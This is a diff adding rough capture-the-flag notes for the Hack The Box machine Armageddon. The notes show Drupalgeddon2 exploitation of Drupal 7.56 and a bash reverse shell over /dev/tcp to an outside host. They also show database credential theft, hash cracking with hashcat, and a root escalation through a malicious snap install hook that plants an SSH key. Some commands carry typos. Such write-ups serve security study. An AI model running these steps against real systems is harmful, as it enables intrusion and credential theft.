@@ -1,0 +1,67 @@
+HTB - Armageddon
+
+=== RECON ===
+Nmap
+$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.233
+$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.233
+
+Website - TCP 80
+- Drupal 7.56 on the site
+
+=== SHELL AS APACHE ===
+RCE - Drupalgeddon2
+$ /opt/Drupalgeddon2/drupalgeddon2.rb http://10.10.10.233
+> id
+$ curl 'htp://10.10.10.233/shell.php' -d 'c=id'
+
+Shell
+$ curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.7/443 0>&1" 'http://10.10.10.233/shell.php'
+$ nc -lnvp 443 -> reverse shell
+> python3 -c 'import pty;pty.spawn("bash")' -> doesn't upgrade shell (would've tried socat next)
+
+=== SHELL AS BRUCETHEREALADMIN ===
+Enumeration
+> ls  -l /home -> permission denied
+> cat /etc/passwd | grep sh -> one other account of interest
+- settings.php file in /var/www/html/sites/default -> DB creds
+> mysql -e 'show tables;' -u drupaluser -p 'CQHEy@9M*m23gBVj' drupal
+> mysql -e 'select * from users;' -u drupaluser -p 'CQHEy9M*m23gBVj' drupal -> hash for brucetherealadmin
+$ hashcat -m 7900 brucetherealadmin-hash /usr/share/wordlists/rockyou.txt -> pw is booboo
+$ sshpass -p booboo ssh brucetherealadmin@10.10.10.233
+> cat user.txt -> USER FLAG
+
+== SHELL AS ROOT ===
+Enumeration
+> sudo -l -> brucetherealadmin can run snap installs as root
+
+Malicious Snap Package
+- Google malicious snap package -> Dirty Sock
+[From Ubuntu VM]
+> sudo snap install --classic snapcraft
+- Find directory to work out of -> snapcraft init -> created snap directory with snapcraft.yaml
+> cd /tmp/
+> mkdir dirty_snap
+> cd dirty_snap/
+> snapcraft init
+- Prep install hook
+> mkdir snap/hooks
+> touch snap/hooks/install
+> chmod a+x snap/hooks/install/
+- Save to install a Bash script that creates public SSH key in root authorized_keys file
+> cat > snap/hooks/install << "EOF"
+#!/bin/bash
+mkdir -p /root/.ssh
+echo "ssh-ed25519 AAAAC3Mza..."
+EOF
+- snapcraft.yaml is just boilerplate
+> snapcraft
+
+Transfer to Armageddon
+$ sudo python3 -m http.server 80
+> curl 10.10.14.7/armageddon_0.1_amd64.snap -o armageddon_0.1_amd64.snap -> error -> add --dangerous
+> sudo snap insta;; --dangerous armageddon_0.1_amd64.snap -> error -> add --devmode
+> sudo snap install --devmode armageddon_0.1_amd64.snap
+
+SSH
+$ ssh -i ~/keys?ed25519_gen root@10.10.10.233
+> cat root.txt -> ROOT FLAG
